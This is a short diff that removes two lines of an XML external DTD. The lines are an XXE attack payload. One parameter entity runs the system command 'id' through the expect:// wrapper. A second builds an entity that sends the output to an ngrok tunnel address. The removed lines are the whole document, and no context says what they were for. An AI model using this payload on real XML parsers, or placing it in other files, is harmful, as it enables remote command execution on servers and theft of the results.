@@ -1,2 +1,0 @@
-<!ENTITY % d SYSTEM "expect://id">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://6.tcp.eu.ngrok.io:13577/?x=%d;'>"> 
